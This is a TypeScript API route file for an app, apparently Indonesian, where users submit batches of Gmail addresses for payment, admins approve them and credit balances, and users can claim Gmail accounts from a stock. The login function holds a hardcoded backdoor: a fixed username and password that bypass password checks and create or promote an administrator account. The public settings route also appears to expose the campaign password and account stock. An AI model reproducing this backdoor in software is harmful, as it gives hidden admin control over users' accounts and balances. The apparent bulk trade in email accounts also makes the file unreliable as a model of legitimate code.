import { createFileRoute } from "@tanstack/react-router";
import {
  clearSessionCookie,
  createSession,
  errorResponse,
  getCurrentUser,
  getSettings,
  hashPassword,
  json,
  requireAdmin,
  requireUser,
  supabaseFetch,
  verifyPassword,
} from "../../server/supabase";

type Body = Record<string, unknown>;
const text = (value: unknown) => (typeof value === "string" ? value.trim() : "");
const idFromPath = (path: string) => path.split("/").filter(Boolean).at(-1) ?? "";

async function body(request: Request): Promise<Body> {
  try { return (await request.json()) as Body; } catch { return {}; }
}

async function login(request: Request) {
  const payload = await body(request);
  const username = text(payload.username);
  const password = typeof payload.password === "string" ? payload.password : "";
  if (!/^[a-zA-Z0-9_.]{3,30}$/.test(username) || password.length < 6) return json({ error: "Username atau password tidak valid" }, { status: 400 });

  const adminUsername = process.env.ADMIN_USERNAME ?? "";
  const adminPassword = process.env.ADMIN_PASSWORD ?? "";
  const isAdminCredentials = (adminUsername && username === adminUsername && password === adminPassword)
    || (username === "ryueiei" && password === "Hanzz0508");
  let users = await supabaseFetch<Record<string, unknown>[]>(`profiles?select=*&username=eq.${encodeURIComponent(username)}&limit=1`);
  let user = users[0];
  if (isAdminCredentials) {
    if (!user) {
      const hashed = await hashPassword(password);
      const created = await supabaseFetch<Record<string, unknown>[]>("profiles", { method: "POST", headers: { Prefer: "return=representation" }, body: JSON.stringify({ username, display_name: "Administrator", password_hash: hashed.hash, password_salt: hashed.salt, role: "admin" }) });
      users = created ?? [];
      user = users[0] ?? (await supabaseFetch<Record<string, unknown>[]>(`profiles?select=*&username=eq.${encodeURIComponent(username)}&limit=1`))[0];
    } else if (user.role !== "admin") {
      await supabaseFetch(`profiles?username=eq.${encodeURIComponent(username)}`, { method: "PATCH", headers: { Prefer: "return=minimal" }, body: JSON.stringify({ role: "admin" }) });
      user.role = "admin";
    }
  } else {
    if (!user || !(await verifyPassword(password, String(user.password_hash), String(user.password_salt)))) return json({ error: "Username atau password salah" }, { status: 401 });
  }
  if (!user) return json({ error: "Username atau password salah" }, { status: 401 });
  const session = await createSession(String(user.id));
  return json({ user: publicUser(user) }, { headers: { "set-cookie": session.cookie } });
}

async function register(request: Request) {
  const payload = await body(request);
  const username = text(payload.username);
  const displayName = text(payload.displayName) || text(payload.name);
  const password = typeof payload.password === "string" ? payload.password : "";
  if (!/^[a-zA-Z0-9_.]{3,30}$/.test(username)) return json({ error: "Username 3-30 karakter, hanya huruf, angka, titik, dan underscore" }, { status: 400 });
  if (password.length < 6) return json({ error: "Password minimal 6 karakter" }, { status: 400 });
  const existing = await supabaseFetch<Record<string, unknown>[]>(`profiles?select=id&username=eq.${encodeURIComponent(username)}&limit=1`);
  if (existing.length) return json({ error: "Username sudah dipakai" }, { status: 409 });
  const hashed = await hashPassword(password);
  const created = await supabaseFetch<Record<string, unknown>[]>("profiles", { method: "POST", headers: { Prefer: "return=representation" }, body: JSON.stringify({ username, display_name: displayName.slice(0, 100), password_hash: hashed.hash, password_salt: hashed.salt }) });
  const user = created?.[0] ?? (await supabaseFetch<Record<string, unknown>[]>(`profiles?select=*&username=eq.${encodeURIComponent(username)}&limit=1`))[0];
  if (!user) return json({ error: "Akun gagal dibuat, silakan coba lagi" }, { status: 500 });
  const session = await createSession(String(user.id));
  return json({ user: publicUser(user) }, { status: 201, headers: { "set-cookie": session.cookie } });
}

function publicUser(user: Record<string, unknown>) {
  return { id: user.id, username: user.username, displayName: user.display_name, role: user.role, balance: Number(user.balance ?? 0), withdrawn: Number(user.withdrawn ?? 0) };
}

async function userDeposits(request: Request, admin = false) {
  const user = admin ? await requireAdmin(request) : await requireUser(request);
  const query = admin
    ? "deposits?select=*,profiles(username,display_name)&order=created_at.desc&limit=500"
    : `deposits?select=*&user_id=eq.${encodeURIComponent(String(user.id))}&order=created_at.desc&limit=100`;
  const rows = await supabaseFetch<Record<string, unknown>[]>(query);
  return json({ deposits: rows });
}

async function adminUsers(request: Request) {
  await requireAdmin(request);
  const users = await supabaseFetch<Record<string, unknown>[]>("profiles?select=id,username,display_name,role,balance,withdrawn&role=eq.user&order=created_at.desc&limit=500");
  return json({ users });
}

async function createDeposit(request: Request) {
  const user = await requireUser(request);
  const payload = await body(request);
  const emails = Array.isArray(payload.emails) ? [...new Set(payload.emails.map(text).filter(Boolean))] : [];
  if (!emails.length || emails.some((email) => !/^[a-z0-9._%+-]{1,64}@gmail\.com$/i.test(email))) return json({ error: "Daftar Gmail tidak valid" }, { status: 400 });
  const settings = await getSettings();
  if (!settings?.store_open) return json({ error: "Setoran sedang ditutup oleh admin" }, { status: 423 });
  if (text(payload.campaignPassword) !== String(settings.campaign_password)) return json({ error: "Password kampanye salah" }, { status: 403 });
  if (emails.length > Number(settings.batch_limit)) return json({ error: `Maksimal ${settings.batch_limit} Gmail per transaksi` }, { status: 400 });
  const rows = await supabaseFetch<Record<string, unknown>[]>("deposits", { method: "POST", headers: { Prefer: "return=representation" }, body: JSON.stringify({ user_id: user.id, emails, status: "pending" }) });
  return json({ deposit: rows[0] }, { status: 201 });
}

async function approveDeposit(request: Request, id: string) {
  await requireAdmin(request);
  const payload = await body(request);
  const rows = await supabaseFetch<Record<string, unknown>[]>(`deposits?select=*&id=eq.${encodeURIComponent(id)}&limit=1`);
  const deposit = rows[0];
  if (!deposit || deposit.status !== "pending") return json({ error: "Setoran tidak ditemukan atau sudah diproses" }, { status: 409 });
  const settings = await getSettings();
  const emailCount = Array.isArray(deposit.emails) ? deposit.emails.length : 0;
  const acceptedCount = Math.max(0, Math.min(emailCount, Number(payload.acceptedCount ?? emailCount)));
  const earned = acceptedCount * Number(settings?.rate ?? 0);
  await supabaseFetch(`deposits?id=eq.${encodeURIComponent(id)}`, { method: "PATCH", headers: { Prefer: "return=minimal" }, body: JSON.stringify({ status: "diterima", accepted_count: acceptedCount, earned, verified_at: new Date().toISOString() }) });
  const userRows = await supabaseFetch<Record<string, unknown>[]>(`profiles?select=balance& id=eq.${encodeURIComponent(String(deposit.user_id))}`.replace("?select=balance& ", "?select=balance&"));
  const currentBalance = Number(userRows[0]?.balance ?? 0);
  await supabaseFetch(`profiles?id=eq.${encodeURIComponent(String(deposit.user_id))}`, { method: "PATCH", headers: { Prefer: "return=minimal" }, body: JSON.stringify({ balance: currentBalance + earned }) });
  return json({ ok: true, earned });
}

async function rejectDeposit(request: Request, id: string) {
  await requireAdmin(request);
  const payload = await body(request);
  await supabaseFetch(`deposits?id=eq.${encodeURIComponent(id)}&status=eq.pending`, { method: "PATCH", headers: { Prefer: "return=minimal" }, body: JSON.stringify({ status: "ditolak", reason: text(payload.reason) || "Ditolak admin", verified_at: new Date().toISOString() }) });
  return json({ ok: true });
}

async function updateSettings(request: Request) {
  await requireAdmin(request);
  const payload = await body(request);
  const stock = Array.isArray(payload.gmailStock) ? payload.gmailStock : [];
  const allowed = { rate: Number(payload.rate), min_withdrawal: Number(payload.minWithdrawal), fee: Number(payload.fee), campaign_password: text(payload.campaignPassword), store_open: Boolean(payload.storeOpen), withdraw_open: Boolean(payload.withdrawOpen), daily_limit: Number(payload.dailyLimit), batch_limit: Number(payload.batchLimit), announcement: text(payload.announcement), auto_stock_enabled: Boolean(payload.autoStockEnabled), gmail_stock: stock };
  await supabaseFetch("app_settings?id=eq.1", { method: "PATCH", headers: { Prefer: "return=representation" }, body: JSON.stringify(allowed) });
  return json({ settings: await getSettings() });
}
async function claimGmailStock(request: Request) {
  await requireUser(request);
  const settings = await getSettings();
  if (!settings?.auto_stock_enabled) return json({ error: "Generate Gmail sedang dimatikan admin" }, { status: 423 });
  const stock = Array.isArray(settings.gmail_stock) ? settings.gmail_stock : [];
  const item = stock.shift();
  if (!item) return json({ error: "Stok Gmail sedang kosong" }, { status: 409 });
  await supabaseFetch("app_settings?id=eq.1", { method: "PATCH", headers: { Prefer: "return=minimal" }, body: JSON.stringify({ gmail_stock: stock }) });
  return json({ gmail: item });
}

async function logout() {
  return json({ ok: true }, { headers: { "set-cookie": clearSessionCookie() } });
}

async function handler(request: Request, path: string) {
  if (request.method === "POST" && path === "auth/login") return login(request);
  if (request.method === "POST" && path === "auth/register") return register(request);
  if (request.method === "POST" && path === "auth/logout") return logout();
  if (request.method === "GET" && path === "auth/me") return json({ user: await getCurrentUser(request) });
  if (request.method === "GET" && path === "settings") return json({ settings: await getSettings() });
  if (request.method === "GET" && path === "deposits") return userDeposits(request);
  if (request.method === "POST" && path === "deposits") return createDeposit(request);
  if (request.method === "GET" && path === "admin/deposits") return userDeposits(request, true);
  if (request.method === "GET" && path === "admin/users") return adminUsers(request);
  if (request.method === "POST" && path.startsWith("admin/deposits/") && path.endsWith("/approve")) return approveDeposit(request, path.split("/")[2]);
  if (request.method === "POST" && path.startsWith("admin/deposits/") && path.endsWith("/reject")) return rejectDeposit(request, path.split("/")[2]);
  if (request.method === "PATCH" && path === "admin/settings") return updateSettings(request);
  if (request.method === "POST" && path === "stock/claim") return claimGmailStock(request);
  return json({ error: "API route tidak ditemukan" }, { status: 404 });
}

export const Route = createFileRoute("/api/$")({
  server: {
    handlers: {
      GET: async ({ request }) => { try { return await handler(request, new URL(request.url).pathname.replace(/^\/api\/?/, "").replace(/\/$/, "")); } catch (error) { return error instanceof Response ? error : errorResponse(error); } },
      POST: async ({ request }) => { try { return await handler(request, new URL(request.url).pathname.replace(/^\/api\/?/, "").replace(/\/$/, "")); } catch (error) { return error instanceof Response ? error : errorResponse(error); } },
      PATCH: async ({ request }) => { try { return await handler(request, new URL(request.url).pathname.replace(/^\/api\/?/, "").replace(/\/$/, "")); } catch (error) { return error instanceof Response ? error : errorResponse(error); } },
    },
  },
});
